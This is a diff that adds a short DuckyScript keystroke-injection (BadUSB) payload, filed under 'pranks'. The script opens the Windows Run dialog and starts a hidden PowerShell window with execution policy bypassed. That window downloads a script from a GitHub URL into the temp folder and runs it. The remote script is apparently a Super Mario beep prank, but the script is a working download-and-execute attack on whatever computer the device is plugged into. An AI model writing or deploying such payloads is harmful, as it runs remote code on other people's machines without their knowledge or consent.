@@ -1,0 +1,6 @@
+DELAY 250
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pilot2254/badusb/main/payloads/pranks/beep-supermario/main.ps1' -OutFile '$env:temp\beep-supermario.ps1'; powershell -ExecutionPolicy Bypass -File '$env:temp\beep-supermario.ps1'"
+DELAY 100
+ENTER
